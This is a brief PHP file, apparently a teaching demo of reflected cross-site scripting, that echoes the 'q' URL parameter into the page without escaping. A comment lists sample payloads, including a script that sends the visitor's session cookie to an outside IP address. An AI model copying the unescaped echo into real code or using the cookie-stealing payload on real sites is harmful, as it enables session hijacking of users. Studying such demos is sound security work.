<?php

/*

http://.../xss.php?q=X
http://.../xss.php?q=<script>console.log('iepa')</script>
http://.../xss.php?q=<script>alert("Hackable!")</script>
<script>new Image().src="http://172.17.43.122/bogus.php?output="+document.cookie;</script>
*/

session_start();

echo "erabilpena: http://.../?q=X";

echo "<p>" . $_GET["q"] . "</p>";